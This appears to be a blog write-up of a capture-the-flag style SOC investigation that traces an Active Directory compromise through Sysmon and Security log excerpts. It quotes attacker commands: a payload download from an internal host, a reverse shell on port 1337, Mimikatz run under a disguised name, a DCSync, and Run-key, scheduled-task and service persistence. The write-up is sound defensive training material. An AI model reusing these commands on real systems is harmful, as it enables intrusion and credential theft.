---
title: "HTB-GhostTrace"
date: 2026-01-31
draft: false
tags:
  - SOC
  - 
platform: SOC
---
{{< infobox difficulty="Easy" os="Windows" date="2026-01-31" >}}

**Description:**
You are a blue team analyst tasked with investigating a suspected breach in an Active Directory environment named Main.local. The network includes a Domain Controller (DC01 and two client machines (Client02 and Client03). A user on Client03 received a phishing email, leading to a series of attacks that compromised the domain. Your job is to analyze the provided Windows Event Logs and Sysmon logs from Client02, Client03, and DC01 to reconstruct the attack chain, identify the attacker’s actions, and uncover critical artifacts such as credentials, hashes, and persistence mechanisms.


## what we've got
I've got a logs files.
```
    ├── Logs-Client02
    │   ├── Application.evtx
    │   ├── C
    │   │   └── $MFT
    │   ├── Powershell.evtx
    │   ├── Security.evtx
    │   └── Sysmon.evtx
    ├── Logs-Client03
    │   ├── Application.evtx
    │   ├── C
    │   │   └── $MFT
    │   ├── Powershell.evtx
    │   ├── Security.evtx
    │   └── Sysmon.evtx
    └── Logs-DC
        ├── Application.evtx
        ├── C
        │   └── $MFT
        ├── Powershell.evtx
        ├── Security.evtx
        └── Sysmon.evtx
```

## Client02 logs
### sysmon.evtx
I analyzed the Sysmon logs and identified the initial compromise on **Client02** at `2025-05-25 03:27:56 UTC`.
The victim user `jody` opened a macro-enabled Word document named `Profits.docm` from the Downloads folder, which initiated the attack chain.

*Sysmon Event ID 1 - Process Creation:*
```
Event Time: 2025-05-25 03:27:56.996
Process: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
CommandLine: "C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\jody\Downloads\Profits.docm" /o ""
User: MAIN\jody
Parent Process: C:\Windows\explorer.exe (PID 2092)
Process ID: 1160
Working Directory: C:\Users\jody\Downloads\
```

\- Malicious file: `Profits.docm`  
\- User: `jody` on domain `MAIN.local`  
\- Execution triggered from Downloads folder  
\- PID 1160


`Profits.docm` executed a cmd.exe with PID 8896
```
8996
C:\Windows\System32\cmd.exe
Cmd.Exe
C:\Windows\System32\cmd.exe
C:\Users\jody\Documents\
MAIN\jody
1160
C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
"C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\jody\Downloads\Profits.docm" /o ""
MAIN\jody
```

after that executed a powershell with PID 4776
```
4776
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

PowerShell.EXE
powershell.exe
C:\Users\jody\Documents\
MAIN\jody

8996
C:\Windows\System32\cmd.exe
C:\Windows\System32\cmd.exe
MAIN\jody
```

```
5/25/2025 6:32:02 AM
Invoke-WebRequest -Uri "http://192.168.204.152/UpdatePolicy.exe" -OutFile "C:\Users\jody\Downloads\UpdatePolicy.exe"
```

after that executed `UpdatePolicy.exe`
```
2025-05-25 06:32:23 AM
2860
C:\Users\jody\Downloads\UpdatePolicy.exe
"C:\Users\jody\Downloads\UpdatePolicy.exe"
C:\Users\jody\Documents\
MAIN\jody
4776
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
powershell.exe
MAIN\jody
```



What port was used for the reverse shell connection from the second-stage payload on Client02?
1337
```
2025-05-25 07:28:17 AM
4352
C:\Users\jody\Downloads\UpdatePolicy.exe
192.168.204.129
49956
192.168.204.152
1337
```

in powershell.evtx found:
```
2025-05-25 06:37:03 AM
Creating Scriptblock text (1 of 1):
{
                    if ($PSBoundParameters['Raw']) {
                        # return raw result objects
                        $Group = $_
                    }
                    else {
                        $Group = Convert-LDAPProperty -Properties $_.Properties
                    }
                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                    $Group
                }

ScriptBlock ID: 232ebf81-40d1-402f-8910-9ee157bc7dca
Path: C:\Users\jody\Downloads\PowerView.ps1
```




service account
SecurityDC.evtx
```
5/25/2025 6:42:33 AM
Account Information:
	Account Name:		jody@MAIN.LOCAL
	Account Domain:		MAIN.LOCAL
	Logon GUID:		{7804a58c-08b2-101c-f072-ae2c8fb8d1aa}

Service Information:
	Service Name:		sqlsvc
	Service ID:		S-1-5-21-620716483-2719109048-3577772375-2115


Additional Information:
	Ticket Options:		0x40810000
	Ticket Encryption Type:	0x17
	Failure Code:		0x0
	Transited Services:	-
```



succeseful login
SecurityDC.evtx
Event 4776
```
5/25/2025 7:03:47 AM

Authentication Package:	MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
Logon Account:	sqlsvc
Source Workstation:	
Error Code:	0x0
```


What is the executable associated with the first service created by a Sysinternals tool on the target system following the attacker's initial login attempt?
After moving laterally to Client03 via the malicious service VgYTbFEK.exe (a renamed PsExec executable), the attacker spawned a command shell (cmd.exe) with NT AUTHORITY\SYSTEM privileges at 04:05:12 UTC. Following this access, they performed manual post-exploitation reconnaissance to verify their high-integrity context and identify potential targets, executing whoami at 04:07:57 UTC to confirm system-level access and net user at 04:08:23 UTC to enumerate local accounts before proceeding with credential dumping.
```
-
2025-05-25 07:05:12.119
EV_RenderedValue_2.00
4
System
C:\Windows\VgYTbFEK.exe
NT AUTHORITY\SYSTEM
```

On Client03, what was the file name of the executable used to dump cleartext credentials from memory?
At 04:10:01 UTC, the attacker escalated their execution environment by spawning a PowerShell process (PID 6304) from the existing Command Shell. This session was subsequently used at 04:10:43 UTC to execute C:\Users\jody\Downloads\netdiag.exe. Sysmon metadata explicitly identifies this binary as Mimikatz, confirming the attacker utilized file masquerading (T1036) to disguise the credential dumping tool as a legitimate network utility while operating with SYSTEM privileges.
```
2025-05-25 07:10:19.853
EV_RenderedValue_2.00
6304
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
C:\Users\jody\Downloads\netdiag.exe
2025-05-25 04:10:19.853
NT AUTHORITY\SYSTEM
```
Following the successful credential dump, the attacker immediately leveraged the compromised information at 04:12:21 UTC. Using the native runas.exe utility with the command /user:Main\lucas cmd, they instantiated a new command shell under the identity of the user lucas, confirming that cleartext credentials for this account were recovered from memory.



At 2025-05-25 04:26:36 UTC, the attacker utilized the compromised MAIN\lucas account to execute a DCSync attack against the domain controller (DC01)
This activity was identified via Event ID 4662 in the Domain Controller's security logs. The log indicates an access attempt by lucas containing the specific property GUID {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}. This GUID corresponds to the DS-Replication-Get-Changes-All extended right, which allows the account to request replication of sensitive domain data, including password hashes (KRBTGT), effectively compromising the entire Active Directory domain.
```
  SubjectUserSid S-1-5-21-620716483-2719109048-3577772375-2114 
  SubjectUserName lucas 
  SubjectDomainName MAIN 
  SubjectLogonId 0x3aef74 
  ObjectServer DS 
  ObjectType %{19195a5b-6da0-11d0-afd3-00c04fd930c9} 
  ObjectName %{b426bd63-8141-407d-b9df-12a6730bdca0} 
  OperationType Object Access 
  HandleId 0x0 
  AccessList %%7688  
  AccessMask 0x100 
  Properties %%7688 {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} {19195a5b-6da0-11d0-afd3-00c04fd930c9}  
  AdditionalInfo - 
  AdditionalInfo2  
```



Following the successful DCSync attack, the attacker utilized the compromised Administrator credentials to authenticate against the domain. This activity was observed in the Logs-DC\Security.evtx at 2025-05-25 04:34:01 UTC. This confirms the adversary successfully leveraged the stolen hashes to assume full Domain Admin privileges and initiate a session.









```
  RuleName technique_id=T1012,technique_name=Query Registry 
  UtcTime 2025-05-25 04:40:09.243 
  ProcessGuid {c1728745-9f29-6832-3d01-000000007200} 
  ProcessId 6436 
  Image C:\Windows\System32\reg.exe 
  FileVersion 10.0.20348.1 (WinBuild.160101.0800) 
  Description Registry Console Tool 
  Product Microsoft® Windows® Operating System 
  Company Microsoft Corporation 
  OriginalFileName reg.exe 
  CommandLine "C:\Windows\system32\reg.exe" add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v xcvafctr /t REG_SZ /d C:\Windows\System32\scvhost.exe /f 
  CurrentDirectory C:\Users\Administrator\Documents\ 
  User MAIN\Administrator 
  LogonGuid {c1728745-9db9-6832-21ce-3c0000000000} 
  LogonId 0x3cce21 
  TerminalSessionId 0 
  IntegrityLevel High 
  Hashes SHA1=E65FAA187D27D84106B78B909C06D405837EC64E,MD5=EB20E119AAF500E2752DC5A588B54C12,SHA256=C6A168C81654F5901E864C8FD61FA54F084CD8B2E0A8AC1B83EACF9EB4484F75,IMPHASH=E23A24F7BA9B35B3E9706724F6749860 
  ParentProcessGuid {c1728745-9db9-6832-3201-000000007200} 
  ParentProcessId 2748 
  ParentImage C:\Windows\System32\wsmprovhost.exe 
  ParentCommandLine C:\Windows\system32\wsmprovhost.exe -Embedding 
  ParentUser MAIN\Administrator 
```


```
  RuleName technique_id=T1053.005,technique_name=Scheduled Task/Job 
  UtcTime 2025-05-25 04:38:53.011 
  ProcessGuid {c1728745-9edd-6832-3701-000000007200} 
  ProcessId 1216 
  Image C:\Windows\System32\schtasks.exe 
  FileVersion 10.0.20348.1 (WinBuild.160101.0800) 
  Description Task Scheduler Configuration Tool 
  Product Microsoft® Windows® Operating System 
  Company Microsoft Corporation 
  OriginalFileName schtasks.exe 
  CommandLine "C:\Windows\system32\schtasks.exe" /create /tn WindowsUpdateCheck /tr C:\Windows\System32\scvhost.exe /sc onstart /ru SYSTEM /f 
  CurrentDirectory C:\Users\Administrator\Documents\ 
  User MAIN\Administrator 
  LogonGuid {c1728745-9db9-6832-21ce-3c0000000000} 
  LogonId 0x3cce21 
  TerminalSessionId 0 
  IntegrityLevel High 
  Hashes SHA1=C7548A5CBF90C68A1396147BF7B9E878C7DF8B4C,MD5=A5C613AE2541EE5FFB83E2882DC148C2,SHA256=7AFCC83C671A6142996A2F6BE94D533D000D943A8BA2293851A4232B76FA29AD,IMPHASH=44E70F20C235C150D75F6FC8B1E29CD1 
  ParentProcessGuid {c1728745-9db9-6832-3201-000000007200} 
  ParentProcessId 2748 
  ParentImage C:\Windows\System32\wsmprovhost.exe 
  ParentCommandLine C:\Windows\system32\wsmprovhost.exe -Embedding 
  ParentUser MAIN\Administrator 

```

```
  RuleName technique_id=T1543.003,technique_name=Windows Service 
  UtcTime 2025-05-25 04:43:01.264 
  ProcessGuid {c1728745-9fd5-6832-4701-000000007200} 
  ProcessId 6232 
  Image C:\Windows\System32\sc.exe 
  FileVersion 10.0.20348.1 (WinBuild.160101.0800) 
  Description Service Control Manager Configuration Tool 
  Product Microsoft® Windows® Operating System 
  Company Microsoft Corporation 
  OriginalFileName sc.exe 
  CommandLine "C:\Windows\system32\sc.exe" create WindowsUpdateSvc binPath= C:\Windows\System32\scvhost.exe start= auto 
  CurrentDirectory C:\Users\Administrator\Documents\ 
  User MAIN\Administrator 
  LogonGuid {c1728745-9db9-6832-21ce-3c0000000000} 
  LogonId 0x3cce21 
  TerminalSessionId 0 
  IntegrityLevel High 
  Hashes SHA1=75881652F0F9384DE229AB396BF27F1DDA244BBC,MD5=6FB10CD439B40D92935F8F6A0C99670A,SHA256=2BF663EA493CDC21AD33AEBD8DA40CC5D2AFA55E24F9E1BBF3D73E99DCADF693,IMPHASH=803254E010814E69947095A2725B2AFD 
  ParentProcessGuid {c1728745-9db9-6832-3201-000000007200} 
  ParentProcessId 2748 
  ParentImage C:\Windows\System32\wsmprovhost.exe 
  ParentCommandLine C:\Windows\system32\wsmprovhost.exe -Embedding 
  ParentUser MAIN\Administrator 

```